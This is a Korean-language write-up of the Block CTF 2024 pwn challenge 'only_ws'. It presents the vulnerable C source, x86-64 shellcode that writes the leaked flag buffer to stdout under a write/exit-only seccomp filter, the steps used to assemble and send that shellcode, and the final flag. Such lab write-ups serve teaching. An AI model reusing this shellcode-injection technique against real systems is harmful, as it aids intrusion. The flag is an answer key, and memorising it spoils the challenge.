<!DOCTYPE html>
<html>
<head>
        <link rel="stylesheet" type="text/css" href="sytle.css">
</head>
<body>
        <h1>Block CTF 2024 #Pwn only_ws Write-Up</h1>
</body>
<br>
<br>
</html>

![image](https://github.com/user-attachments/assets/048040d5-20fb-417f-a909-52dd4d96fd2c)

먼저 문제를 살펴보면 flag가 적혀있다고한다.

우선 ```nc```명령어를 이용해서 문제 서버로 접속해 보았다.

![image](https://github.com/user-attachments/assets/218c2e45-e58a-4c8d-8a54-903dbd85cac3)

Flag is at 0x4040a0이라고 나온다. 아마도 flag 주소일 것이다.

이어서 ```only_ws.c```파일을 다운로드 받았다.

```python
#include <seccomp.h>
#include <syscall.h>

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#include <string.h>

typedef void shellcode();
char flag[64];

int main(int argc, char **argv) {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  FILE *f = fopen("flag.txt", "r");
  if (f == NULL) {
    printf("error reading flag");
    return -1;
  }

  fscanf(f, "%s", flag);
  printf("Flag is at 0x%x\n", (void *)flag);
  fclose(f);

  char shellcode_buf[4096];
  int bytes_read = read(STDIN_FILENO, shellcode_buf, sizeof(shellcode_buf));

  void *shellcode_ptr =
      mmap((void *)shellcode_buf, 1, PROT_READ | PROT_WRITE | PROT_EXEC,
           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  memcpy(shellcode_ptr, shellcode_buf, bytes_read);

  scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL_PROCESS);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);

  seccomp_load(ctx);
  seccomp_release(ctx);
  ((shellcode *)shellcode_ptr)();
}
```

일단 코드를 살펴보면 가장 눈에 띄는 것은 flag 메모리 주소가 노출되어 있다는 점이다.

또한 ```seccomp``` 필터를 사용해서 ```write```와 ```exit``` 시스템 콜만을 허용하고 있다. 

그래서 나는 flag 변수의 주소를 이용하여 flag 데이터를 읽어오는 쉘코드를 작성해서 flag 값을 ```write``` 시스템 콜을 이용해 출력해보려 한다.

우선 flag의 주소 값을 읽고 ```write```을 통해 출력하는 어셈블리 코드를 작성했다.

```python
section .text
global _start

_start:
    ; 파일 디스크립터를 표준 출력 (1)로 설정
    mov rdi, 1                    ; rdi에 파일 디스크립터 1 저장 (표준 출력)

    ; flag의 메모리 주소를 rsi에 설정
    mov rsi, 0x4040a0             ; rsi에 flag의 메모리 주소 (0x4040a0) 저장

    ; 출력할 바이트 수 설정
    mov rdx, 64                   ; 최대 64바이트 출력 (flag 배열의 크기만큼)

    ; write 시스템 콜 호출 (시스템 콜 번호 1)
    mov rax, 1                    ; rax에 시스템 콜 번호 1 (write) 저장
    syscall                       ; 시스템 콜 실행

```
![image](https://github.com/user-attachments/assets/d184f6cb-4153-46fa-b086-be935b87f6ad)

코드에 대해 좀더 자세히 설명해 보자면

mov rdi, 1 : rdi 레지스터에 파일 디스크립터 1을 설정하여 표준 출력으로 출력하도록 한다.

mov rsi, 0x4040a0 : rsi 레지스터에 flag의 메모리 주소(0x4040a0)를 설정하여 write 시스템 콜에서 이 주소의 데이터를 읽어 출력할 수 있도록 한다.

mov rdx, 64 : rdx 레지스터에 읽고 출력할 바이트 수를 설정하고 flag의 크기인 64바이트로 설정한다.

mov rax, 1 : rax 레지스터에 write 시스템 콜 번호인 1을 설정한다.

syscall : 시스템 콜을 호출하여 flag 내용을 출력한다.

이어서 작성한 어셈블리 코드를 쉘코드로 변환해보았다.

![image](https://github.com/user-attachments/assets/38049a54-37de-4df5-af2b-ed797cddbb20)

그리고 ```objdump```명령어를 사용해 쉘코드를 \x형식의 바이트 코드로 추출했다.

![image](https://github.com/user-attachments/assets/bc2ef3cd-ebfb-49ce-8b14-9ef755879b0a)

나온 쉘코드를 순수 바이트 코드 형태로 정리한 후 ```echo -ne```명령어를 이용해 바이너리 파일로 저장하였다.

![image](https://github.com/user-attachments/assets/3f8da926-4908-4e35-9052-40c0a2410dc6)

이후 만들어진 쉘코드를 서버로 전달해 주었다.

![image](https://github.com/user-attachments/assets/ae45bf67-da6d-40a8-8dc0-f143521fdb58)

flag를 얻었다!!
flag{kinda_like_orw_but_only_ws}
